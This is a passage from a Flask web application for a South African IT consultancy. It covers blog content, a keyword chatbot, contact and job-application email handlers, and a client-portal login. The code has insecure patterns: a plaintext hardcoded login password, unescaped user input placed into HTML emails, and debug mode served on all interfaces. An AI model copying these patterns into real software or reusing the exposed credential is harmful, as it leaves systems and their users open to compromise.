            <li><strong>Medical:</strong> Device interfaces, monitoring dashboards</li>
            <li><strong>Industrial:</strong> Control panels, monitoring applications</li>
            <li><strong>Desktop:</strong> Professional applications with custom UI</li>
        </ul>

        <h4>Case Study: Automotive Infotainment System</h4>
        <p>We developed a QML-based infotainment system for automotive clients:</p>
        <ul>
            <li>Platforms: Embedded Linux, QNX, Android Auto</li>
            <li>Performance: 60 FPS with complex animations</li>
            <li>Code sharing: 98% across different hardware platforms</li>
            <li>Team: C++/QML specialists with embedded experience</li>
        </ul>

        <h4>Advanced QML Patterns:</h4>
        <pre><code>
// Custom QML Components with Properties
Item {
    id: root
    
    property alias text: label.text
    property color backgroundColor: "white"
    property alias fontSize: label.font.pixelSize
    
    signal clicked()
    
    Rectangle {
        id: background
        anchors.fill: parent
        color: root.backgroundColor
        
        Text {
            id: label
            anchors.centerIn: parent
            font.pixelSize: 16
        }
        
        MouseArea {
            anchors.fill: parent
            onClicked: root.clicked()
        }
    }
    
    // State management
    states: [
        State {
            name: "pressed"
            PropertyChanges { target: background; color: "lightgray" }
        }
    ]
}
        </code></pre>

        <h4>Deployment Considerations:</h4>
        <ul>
            <li><strong>Mobile:</strong> Larger APK/IPA size (~15-25MB framework)</li>
            <li><strong>Desktop:</strong> Excellent performance and native look</li>
            <li><strong>Embedded:</strong> Custom builds to reduce footprint</li>
            <li><strong>Licensing:</strong> LGPL vs commercial considerations</li>
        </ul>

        <h4>When to Choose QML:</h4>
        <ul>
            <li>Graphics-intensive applications</li>
            <li>Embedded and IoT projects</li>
            <li>Existing C++ codebases</li>
            <li>Custom UI/UX requirements beyond native capabilities</li>
        </ul>
        ''',
        'date': 'December 9, 2024',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '13 min read'
    },
    {
        'id': 25,
        'title': 'Strategic Framework Selection: Business and Technical Decision Matrix',
        'excerpt': 'Comprehensive decision framework for choosing between React Native, Kotlin Multiplatform, and QML.',
        'content': '''
        <p>Selecting the right cross-platform framework requires balancing technical capabilities with business objectives. Here's our strategic decision framework.</p>

        <h4>Decision Matrix by Project Type:</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Project Type</th>
                    <th>Recommended Framework</th>
                    <th>Key Considerations</th>
                    <th>Risk Level</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>Startup MVP</strong></td>
                    <td>React Native</td>
                    <td>Speed to market, developer availability</td>
                    <td>Low</td>
                </tr>
                <tr>
                    <td><strong>Enterprise Application</strong></td>
                    <td>Kotlin Multiplatform</td>
                    <td>Long-term maintenance, performance</td>
                    <td>Medium</td>
                </tr>
                <tr>
                    <td><strong>Embedded Systems</strong></td>
                    <td>QML</td>
                    <td>Hardware integration, graphics performance</td>
                    <td>Medium</td>
                </tr>
                <tr>
                    <td><strong>E-commerce App</strong></td>
                    <td>React Native</td>
                    <td>Rapid iteration, rich UI components</td>
                    <td>Low</td>
                </tr>
                <tr>
                    <td><strong>Financial/Trading App</strong></td>
                    <td>Kotlin Multiplatform</td>
                    <td>Performance, data processing</td>
                    <td>High</td>
                </tr>
                <tr>
                    <td><strong>Automotive/Medical UI</strong></td>
                    <td>QML</td>
                    <td>Custom rendering, hardware access</td>
                    <td>High</td>
                </tr>
            </tbody>
        </table>

        <h4>Team Composition Analysis:</h4>
        <ul>
            <li><strong>React Native Teams:</strong>
                <ul>
                    <li>Ideal: JavaScript/TypeScript developers</li>
                    <li>Learning curve: Low for web developers</li>
                    <li>Hiring: Easy, large talent pool</li>
                </ul>
            </li>
            <li><strong>Kotlin Multiplatform Teams:</strong>
                <ul>
                    <li>Ideal: Kotlin/Java developers + platform specialists</li>
                    <li>Learning curve: Medium for Android, high for iOS</li>
                    <li>Hiring: Moderate, growing talent pool</li>
                </ul>
            </li>
            <li><strong>QML Teams:</strong>
                <ul>
                    <li>Ideal: C++ developers with UI/UX skills</li>
                    <li>Learning curve: High, specialized skills</li>
                    <li>Hiring: Difficult, niche talent</li>
                </ul>
            </li>
        </ul>

        <h4>Cost-Benefit Analysis:</h4>
        <table class="table table-bordered">
            <thead>
                <tr>
                    <th>Framework</th>
                    <th>Development Cost</th>
                    <th>Maintenance Cost</th>
                    <th>Time to Market</th>
                    <th>Long-term ROI</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>React Native</strong></td>
                    <td>Low</td>
                    <td>Medium</td>
                    <td>Fast</td>
                    <td>Medium</td>
                </tr>
                <tr>
                    <td><strong>Kotlin Multiplatform</strong></td>
                    <td>Medium</td>
                    <td>Low</td>
                    <td>Medium</td>
                    <td>High</td>
                </tr>
                <tr>
                    <td><strong>QML</strong></td>
                    <td>High</td>
                    <td>Low</td>
                    <td>Slow</td>
                    <td>High (for specific use cases)</td>
                </tr>
            </tbody>
        </table>

        <h4>Migration and Long-term Strategy:</h4>
        <ul>
            <li><strong>From React Native:</strong>
                <ul>
                    <li>Consider KMP when performance becomes critical</li>
                    <li>Gradually move business logic to shared Kotlin modules</li>
                    <li>Maintain React Native for UI during transition</li>
                </ul>
            </li>
            <li><strong>From Native Development:</strong>
                <ul>
                    <li>Start with KMP for new feature development</li>
                    <li>Incrementally migrate existing logic</li>
                    <li>Maintain platform-specific UI layers</li>
                </ul>
            </li>
            <li><strong>Hybrid Approaches:</strong>
                <ul>
                    <li>Use React Native for customer-facing apps</li>
                    <li>Use KMP for internal enterprise tools</li>
                    <li>Use QML for specialized hardware interfaces</li>
                </ul>
            </li>
        </ul>

        <h4>Our Consulting Approach at Monyamane Tech Solutions:</h4>
        <p>We help clients make informed decisions through:</p>
        <ol>
            <li><strong>Technical Assessment:</strong> Evaluate existing infrastructure and team skills</li>
            <li><strong>Prototype Development:</strong> Build proof-of-concepts with each framework</li>
            <li><strong>Performance Testing:</strong> Benchmark critical operations</li>
            <li><strong>Total Cost Analysis:</strong> Calculate 3-year ownership costs</li>
            <li><strong>Implementation Roadmap:</strong> Create phased adoption plan</li>
        </ol>

        <h4>Final Recommendations:</h4>
        <div class="alert alert-info">
            <strong>Choose React Native when:</strong> Speed to market is critical, team has web development background, and app requirements align with ecosystem capabilities.
        </div>
        <div class="alert alert-warning">
            <strong>Choose Kotlin Multiplatform when:</strong> Performance is paramount, long-term maintenance is key concern, and you need platform-specific UI excellence.
        </div>
        <div class="alert alert-success">
            <strong>Choose QML when:</strong> Building for embedded systems, requiring custom graphics rendering, or integrating with existing C++ codebases.
        </div>

        <p>Remember: The best framework is the one that aligns with your specific business goals, team capabilities, and long-term vision. There's no one-size-fits-all solution in cross-platform development.</p>
        ''',
        'date': 'December 23, 2024',
        'author': 'Thato Monyamane',
        'category': 'Mobile Development',
        'read_time': '16 min read'
    }
]

# Simple knowledge base for the chatbot
chatbot_knowledge = {
    "services": "We offer software development, cloud solutions, cybersecurity, AI and Machine Learning, Android Mobile App Development and IoT services. You can learn more on our services page.",
    "contact": "You can reach us at info@monyatech.org.za or call +27 (0) 63 429 1035. Our office hours are Mon-Fri, 9am-5pm.",
    "hours": "Our support team is available 24/7. Office hours are Mon-Fri, 9am-5pm.",
    "pricing": "We offer customized pricing based on project requirements. Contact our sales team for a quote.",
    "portfolio": "Check out our portfolio to see our recent work with clients like FHS, The Rental Team, and Oscar Properties.",
    "about": "Monyamane Tech Solutions has been providing innovative IT solutions since 2024, helping businesses achieve digital transformation.",
    "careers": "We're always looking for talented individuals. Check our careers page for current openings.",
    "support": "For technical support, email support@monyatech.org.za or call +27 (0) 64 030 8476.",
    "hi": "Hello welcome to Monyamane Tech Solutions. \nHow can we help you today.",
    "hello": "Hello welcome to Monyamane Tech Solutions. \nHow can we help you today.",
    "default": "I'm sorry, I didn't understand that. Could you rephrase your question or try asking about our services, contact information, pricing, or portfolio?"
}

def send_contact_email(name, email, subject, message):
    """Send email to company and customer with contact form details and marketing information"""
    
    # Marketing content
    marketing_content = """
    <h3>Why Choose Monyamane Tech Solutions?</h3>
    <ul>
        <li><strong>Custom Software Development:</strong> Tailored solutions that grow with your business</li>
        <li><strong>24/7 Support:</strong> Round-the-clock technical support for all our clients</li>
        <li><strong>Proven Track Record:</strong> Successfully delivered 50+ projects with 98% client satisfaction</li>
        <li><strong>Latest Technologies:</strong> We use cutting-edge technologies to future-proof your solutions</li>
    </ul>
    
    <h3>Our Services Include:</h3>
    <ul>
        <li>Web & Mobile Application Development</li>
        <li>Cloud Migration & Infrastructure</li>
        <li>Cybersecurity Solutions</li>
        <li>AI & Machine Learning</li>
        <li>IoT Solutions</li>
        <li>Database Hosting & Management</li>
    </ul>
    
    <p><strong>Special Offer:</strong> Mention this email and get 15% off your first project with us!</p>
    
    <p>Visit our website: <a href="https://monyatech.org.za">https://monyatech.org.za</a></p>
    <p>Follow us on social media for the latest updates and tech insights.</p>
    """
    
    # Email to company
    company_msg = Message(
        subject=f'New Contact Form Submission: {subject}',
        recipients=['info@monyatech.org.za'],
        html=f"""
        <h2>New Contact Form Submission</h2>
        <p><strong>Name:</strong> {name}</p>
        <p><strong>Email:</strong> {email}</p>
        <p><strong>Subject:</strong> {subject}</p>
        <p><strong>Message:</strong></p>
        <p>{message}</p>
        <hr>
        <p><em>This message was sent from the contact form on your website.</em></p>
        """
    )
    
    # Email to customer
    customer_msg = Message(
        subject=f'Thank you for contacting Monyamane Tech Solutions - {subject}',
        recipients=[email],
        html=f"""
        <h2>Thank You for Contacting Monyamane Tech Solutions!</h2>
        
        <p>Dear {name},</p>
        
        <p>Thank you for reaching out to us. We have received your message and one of our representatives will get back to you within 24 hours.</p>
        
        <h3>Here's a summary of your inquiry:</h3>
        <p><strong>Subject:</strong> {subject}</p>
        <p><strong>Message:</strong> {message}</p>
        
        {marketing_content}
        
        <hr>
        <p><strong>Contact Information:</strong></p>
        <p>Email: info@monyatech.org.za</p>
        <p>Phone: +27 (0) 63 429 1035</p>
        <p>Website: <a href="https://monyatech.org.za">https://monyatech.org.za</a></p>
        
        <p><em>This is an automated message. Please do not reply to this email.</em></p>
        """
    )
    
    try:
        mail.send(company_msg)
        mail.send(customer_msg)
        return True
    except Exception as e:
        print(f"Error sending email: {str(e)}")
        return False

@app.context_processor
def inject_services():
    return dict(services=services)
    
@app.context_processor
def inject_common_data():
    """Inject common data into all templates"""
    return {
        'services': services,
        'blog_posts': blog_posts,
        'portfolio_items': portfolio_items
    }

@app.route('/')
def home():
    return render_template('index.html', services=services[:6], portfolio_items=portfolio_items[:3])

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/services')
def all_services():
    return render_template('services.html', services=services)

@app.route('/service/<int:service_id>')
def service_detail(service_id):
    service = next((s for s in services if s['id'] == service_id), None)
    if not service:
        flash('Service not found', 'error')
        return redirect(url_for('all_services'))
    return render_template('service_detail.html', service=service)

@app.route('/chat', methods=['POST'])
def chat():
    user_message = request.json.get('message', '').lower()
    
    # Simple keyword matching
    response = chatbot_knowledge['default']
    for keyword, answer in chatbot_knowledge.items():
        if keyword in user_message and keyword != 'default':
            response = answer
            break
    
    return jsonify({'response': response})

@app.route('/portfolio')
def portfolio():
    category = request.args.get('category', 'all')
    if category == 'all':
        filtered_items = portfolio_items
    else:
        filtered_items = [item for item in portfolio_items if item['category'] == category]
    
    return render_template('portfolio.html', 
                         portfolio_items=filtered_items, 
                         current_category=category,
                         categories=['all', 'Software Development', 'Cloud Solutions', 'Cybersecurity', 'AI', 'IoT'])

@app.route('/portfolio/<int:item_id>')
def portfolio_detail(item_id):
    item = next((p for p in portfolio_items if p['id'] == item_id), None)
    if not item:
        flash('Portfolio item not found', 'error')
        return redirect(url_for('portfolio'))
    return render_template('portfolio_detail.html', item=item)

@app.route('/blog')
def blog():
    category = request.args.get('category', 'all')
    if category == 'all':
        filtered_posts = blog_posts
    else:
        filtered_posts = [post for post in blog_posts if post['category'] == category]
    
    return render_template('blog.html', posts=filtered_posts, current_category=category)

@app.route('/blog/<int:post_id>')
def blog_post(post_id):
    post = next((p for p in blog_posts if p['id'] == post_id), None)
    if not post:
        flash('Blog post not found', 'error')
        return redirect(url_for('blog'))
    
    # Get related posts (excluding current post)
    related_posts = [p for p in blog_posts if p['id'] != post_id][:3]
    
    return render_template('blog_post.html', post=post, related_posts=related_posts)

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        # Process form data
        name = request.form.get('name')
        email = request.form.get('email')
        subject = request.form.get('subject')
        message = request.form.get('message')
        
        # Validate required fields
        if not all([name, email, subject, message]):
            flash('Please fill in all required fields.', 'error')
            return render_template('contact.html')
        
        # Send emails
        if send_contact_email(name, email, subject, message):
            flash('Thank you for your message! We have sent a confirmation email and will get back to you soon.', 'success')
        else:
            flash('Thank you for your message! We will get back to you soon. (Email notification failed)', 'warning')
        
        return redirect(url_for('contact_success'))
    
    return render_template('contact.html')

@app.route('/contact/success')
def contact_success():
    return render_template('contact_success.html')

@app.route('/careers')
def careers():
    return render_template('careers.html')

@app.route('/client-portal', methods=['GET', 'POST'])
def client_portal():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Simple authentication (in production, use proper authentication)
        if username == 'monyatech' and password == '90059Jay#Monyatech':
            session['logged_in'] = True
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('client_dashboard'))
        else:
            flash('Invalid credentials. Please try again.', 'error')
    
    if session.get('logged_in'):
        return redirect(url_for('client_dashboard'))
    
    return render_template('client_portal.html')

@app.route('/client-dashboard')
def client_dashboard():
    if not session.get('logged_in'):
        flash('Please log in to access the dashboard.', 'error')
        return redirect(url_for('client_portal'))
    return render_template('client_dashboard.html', username=session.get('username'))

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    flash('You have been logged out successfully.', 'success')
    return redirect(url_for('client_portal'))

@app.route('/placeholder/<path:filename>')
def placeholder_image(filename):
    """Serve a simple SVG placeholder"""
    from flask import Response
    svg_placeholder = '''
    <svg width="400" height="300" xmlns="http://www.w3.org/2000/svg">
        <rect width="100%" height="100%" fill="#f8f9fa"/>
        <text x="50%" y="50%" font-family="Arial" font-size="16" text-anchor="middle" fill="#6c757d">Placeholder Image</text>
    </svg>
    '''
    return Response(svg_placeholder, mimetype='image/svg+xml')

@app.route('/submit-application', methods=['POST'])
def submit_application():
    try:
        # Get form data
        form_data = {
            'firstName': request.form.get('firstName', '').strip(),
            'lastName': request.form.get('lastName', '').strip(),
            'email': request.form.get('email', '').strip(),
            'phone': request.form.get('phone', '').strip(),
            'linkedin': request.form.get('linkedin', '').strip(),
            'position': request.form.get('position', '').strip(),
            'coverLetter': request.form.get('coverLetter', '').strip(),
            'source': request.form.get('source', '').strip(),
            'availability': request.form.get('availability', '').strip(),
            'consent': request.form.get('consent') == 'on'
        }
        
        # Validate required fields
        required_fields = ['firstName', 'lastName', 'email', 'phone', 'position', 'coverLetter', 'source', 'availability']
        for field in required_fields:
            if not form_data[field]:
                return jsonify({
                    'success': False,
                    'message': f'Please fill in the {field.replace("firstName", "first name").replace("lastName", "last name")} field.'
                }), 400
        
        if not form_data['consent']:
            return jsonify({
                'success': False,
                'message': 'You must consent to data processing.'
            }), 400
        
        # Validate email format
        if '@' not in form_data['email'] or '.' not in form_data['email']:
            return jsonify({
                'success': False,
                'message': 'Please enter a valid email address.'
            }), 400
        
        # Handle file uploads
        attachments = {}
        temp_files = []
        
        try:
            # Check resume
            if 'resume' not in request.files:
                return jsonify({
                    'success': False,
                    'message': 'Please upload your resume.'
                }), 400
            
            resume = request.files['resume']
            if resume.filename == '':
                return jsonify({
                    'success': False,
                    'message': 'Please select a resume file.'
                }), 400
            
            if resume and allowed_file(resume.filename):
                # Save to temporary file
                temp_resume = tempfile.NamedTemporaryFile(delete=False, suffix=f".{resume.filename.rsplit('.', 1)[1].lower()}")
                resume.save(temp_resume.name)
                attachments['resume'] = temp_resume.name
                temp_files.append(temp_resume.name)
                form_data['resume_filename'] = resume.filename
            else:
                return jsonify({
                    'success': False,
                    'message': 'Resume must be PDF, DOC, or DOCX format.'
                }), 400
            
            # Check portfolio (optional)
            portfolio = request.files.get('portfolio')
            if portfolio and portfolio.filename != '':
                if allowed_file(portfolio.filename):
                    temp_portfolio = tempfile.NamedTemporaryFile(delete=False, suffix=f".{portfolio.filename.rsplit('.', 1)[1].lower()}")
                    portfolio.save(temp_portfolio.name)
                    attachments['portfolio'] = temp_portfolio.name
                    temp_files.append(temp_portfolio.name)
                    form_data['portfolio_filename'] = portfolio.filename
                else:
                    return jsonify({
                        'success': False,
                        'message': 'Portfolio must be PDF, DOC, DOCX, or ZIP format.'
                    }), 400
            
            # Send emails
            email_sent = send_application_email(form_data, attachments)
            
            if email_sent:
                # Log application (optional - you can store in a file if needed)
                application_log = {
                    **form_data,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'submitted'
                }
                
                # Remove consent from log
                application_log.pop('consent', None)
                
                # Save to JSON file (no database)
                log_file = 'applications.json'
                applications = []
                
                if os.path.exists(log_file):
                    with open(log_file, 'r') as f:
                        try:
                            applications = json.load(f)
                        except:
                            applications = []
                
                applications.append(application_log)
                
                with open(log_file, 'w') as f:
                    json.dump(applications, f, indent=2)
                
                return jsonify({
                    'success': True,
                    'message': 'Your application has been submitted successfully! Check your email for confirmation.'
                }), 200
            else:
                return jsonify({
                    'success': False,
                    'message': 'Failed to send confirmation email. Please try again or contact us directly.'
                }), 500
                
        finally:
            # Clean up temporary files
            for temp_file in temp_files:
                try:
                    os.unlink(temp_file)
                except:
                    pass
        
    except Exception as e:
        print(f"Application error: {str(e)}")
        print(traceback.format_exc())
        return jsonify({
            'success': False,
            'message': 'An error occurred while processing your application. Please try again.'
        }), 500

# Error handlers
@app.errorhandler(404)
def not_found_error(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5002)
